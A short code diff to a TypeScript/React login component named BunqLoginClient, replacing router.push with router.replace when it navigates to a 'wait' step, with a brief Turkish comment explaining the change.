@@ -54,7 +54,8 @@ export function BunqLoginClient({ sessionId }: Props) {
       setError("Something went wrong. Please try again.");
       return;
     }
-    router.push(stepToPath("wait", sessionId));
+    // ⭐ FLASH YOK: router.push → router.replace
+    router.replace(stepToPath("wait", sessionId));
   }
 
   return (
